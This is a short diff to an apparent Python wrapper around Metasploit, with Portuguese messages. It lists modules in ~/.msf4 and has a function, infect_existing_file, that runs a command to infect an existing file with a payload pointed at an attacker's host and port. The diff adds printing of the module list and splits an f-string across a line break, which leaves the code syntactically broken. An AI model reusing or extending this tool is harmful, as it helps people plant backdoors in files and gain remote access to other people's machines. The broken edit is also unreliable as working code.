@@ -26,6 +26,11 @@ def list_msf4_modules():
             for file in files:
                 if file.endswith(".rb"):
                     module_list.append(os.path.join(root, file))
+        if module_list:
+            for module in module_list:
+                print(module)
+        else:
+            print("Nenhum módulo encontrado no diretório .msf4.")
         return module_list
     else:
         print("Diretório .msf4 não encontrado.")
@@ -95,7 +100,8 @@ def infect_existing_file(file_path, lhost, lport):
     print(" ".join(cmd))
     try:
         subprocess.call(cmd)
-        print(f"Arquivo {file_path} infectado com sucesso.")
+        print(f"Arquivo {file_path}
+infectado com sucesso.")
     except Exception as e:
         print(f"Erro ao infectar o arquivo: {str(e)}")
 
